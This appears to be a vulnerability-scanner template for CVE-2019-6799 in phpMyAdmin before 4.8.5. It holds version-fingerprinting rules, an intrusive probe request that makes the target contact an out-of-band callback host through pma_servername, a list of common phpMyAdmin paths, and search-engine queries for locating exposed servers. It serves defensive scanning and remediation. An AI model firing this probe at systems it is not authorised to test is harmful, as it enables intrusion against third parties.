http:
- attack: batteringram
  extractors:
  - group: 1
    internal: true
    name: version
    regex:
    - \?v=([0-9.]+)
    type: regex
  - group: 1
    regex:
    - \?v=([0-9.]+)
    type: regex
  - group: 1
    internal: true
    name: phpversion
    part: header
    regex:
    - 'X-Powered-By: PHP/([0-9.]+)'
    type: regex
  matchers:
  - dsl:
    - compare_versions(version, '< 4.8.5')
    type: dsl
  - dsl:
    - compare_versions(version, '> 3.9.9')
    type: dsl
  - dsl:
    - compare_versions(phpversion, '< 7.3.4')
    type: dsl
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - type: word
    words:
    - mysqli_real_connect
  - type: word
    words:
    - pma_servername
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    path:
    - /index.php
    - /pma/index.php
    - /pmd/index.php
    - /phpMyAdmin/index.php
    - /phpmyadmin/index.php
    - /_phpmyadmin/index.php
  raw:
  - 'GET {{path}}?pma_servername={{interactsh-url}}&pma_username={{randstr}}&pma_password={{randstr}}&server=1
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2019-6799
info:
  author: pwnhxl
  classification:
    cpe: cpe:2.3:a:phpmyadmin:phpmyadmin:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-6799
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 5.9
    epss-percentile: 0.95119
    epss-score: 0.13969
  description: 'phpMyAdmin before 4.8.5 is susceptible to local file inclusion. When
    the AllowArbitraryServer configuration setting is set to true, an attacker can
    read, with the use of a rogue MySQL server, any file on the server that the web
    server''s user can access. This is related to the mysql.allow_local_infile PHP
    configuration, and the inadvertent ignoring of options(MYSQLI_OPT_LOCAL_INFIL
    calls.

    '
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access to sensitive files.

    '
  metadata:
    fofa-query: body="pma_servername" && body="4.8.4"
    hunter-query: app.name="phpMyAdmin"&&web.body="pma_servername"&&web.body="4.8.4"
    max-request: 6
    product: phpmyadmin
    shodan-query: title:"phpmyadmin"
    vendor: phpmyadmin
    verified: true
  name: phpMyAdmin <4.8.5 - Local File Inclusion
  reference:
  - https://paper.seebug.org/1112/#_4
  - https://github.com/phpmyadmin/phpmyadmin/commit/828f740158e7bf14aa4a7473c5968d06364e03a2
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6799
  - https://github.com/rmb122/rogue_mysql_server
  - https://github.com/vulnspy/phpmyadmin-4.8.4-allowarbitraryserver
  - https://nvd.nist.gov/vuln/detail/CVE-2019-6799
  remediation: 'Upgrade phpMyAdmin to version 4.8.5 or later to mitigate this vulnerability.

    '
  severity: medium
  tags: cve,cve2019,phpmyadmin,mysql,lfr,intrusive,sqli
